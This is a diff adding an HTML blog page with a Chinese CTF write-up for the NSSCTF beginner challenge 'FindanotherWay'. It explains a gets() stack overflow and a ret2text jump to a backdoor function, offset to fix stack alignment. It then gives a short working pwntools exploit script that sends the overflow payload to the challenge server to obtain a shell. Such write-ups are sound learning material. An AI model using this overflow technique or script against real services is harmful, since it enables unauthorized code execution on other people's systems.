@@ -1,0 +1,36 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>简单的ret2text</title>
+</head>
+<body>
+<b>简单的ret2text</b><br>
+<small>2025-04-20</small>
+<hr>
+<blockquote>
+<p>Problem: <a href="https://www.nssctf.cn/problem/2783">[SWPUCTF 2022 新生赛]FindanotherWay</a></p>
+</blockquote>
+<br><b><a href="#思路"></a>思路</b><br>
+<p>有后门函数0x401230<br>输入函数vuln 调用gets(s) 栈溢出<br>栈12 + 8 覆盖rbp 然后p64后门函数就行<br>注意的是直接用后门函数栈不对齐 故跳过保存rbp 用0x401235 可以getshell</p>
+<br><b><a href="#EXP"></a>EXP</b><br>
+<pre><code>  from pwn import *
+context.log_level = &#x27;debug&#x27;
+elf = ELF(&quot;./FindanotherWay&quot;)
+#libc = ELF(&#x27;/home/rick/glibc-all-in-one/libs/2.31-0ubuntu9.17_amd64/libc-2.31.so&#x27;)
+p = remote(&quot;node5.anna.nssctf.cn&quot;,25105)
+#p = process(&quot;./FindanotherWay&quot;)
+p.recvuntil(b&quot;Maybe another way?\n&quot;)
+payload = b&#x27;a&#x27;*12 +b&#x27;a&#x27; *0x8 + p64(0x401235)
+p.send(payload)
+#attach(p)
+p.interactive()</code></pre>
+
+<br><b><a href="#总结"></a>总结</b><br>
+<ul>
+<li>对该题的考点总结</li>
+</ul>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
